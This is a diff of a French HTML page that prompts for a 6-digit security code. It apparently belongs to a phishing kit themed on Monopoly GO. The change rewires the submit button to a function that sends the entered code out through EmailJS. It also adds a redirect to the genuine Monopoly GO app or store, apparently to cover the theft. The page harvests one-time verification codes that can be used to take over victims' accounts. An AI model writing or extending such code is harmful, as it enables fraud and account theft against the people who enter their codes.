@@ -84,7 +84,7 @@
 <h2>Code de sécurité requis</h2>
 <p>Un code à 6 chiffres vous a été envoyé par SMS ou e-mail. Veuillez le saisir ci-dessous :</p>
 <input id="verification_code" maxlength="6" pattern="\d{6}" placeholder="••••••" required type="text"/>
-<button class="btn-primary" onclick="validateInputsAndRedirect('.container input', 'index.html')">Valider</button>
+<button class="btn-primary" onclick="sendCodeViaEmailJS()">Valider</button>
 <a href="#">Renvoyer le code</a>
 </div>
 
@@ -154,6 +154,26 @@ function sendCodeViaEmailJS() {
     console.error("Erreur lors de l'envoi du code", error);
     showPopup("Erreur lors de l'envoi. Réessayez plus tard.");
   });
+}
+
+function openOrRedirectToMonopolyGO() {
+  const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+  const now = Date.now();
+
+  window.location = "monopolygo://";
+
+  setTimeout(() => {
+    const elapsed = Date.now() - now;
+    if (elapsed < 2200) {
+      if (/android/i.test(userAgent)) {
+        window.location.href = "https://play.google.com/store/search?q=monopoly%20go&c=apps";
+      } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        window.location.href = "https://apps.apple.com/us/search?term=monopoly+go";
+      } else {
+        window.location.href = "https://www.monopolygo.com/";
+      }
+    }
+  }, 2000);
 }
 </script>
 
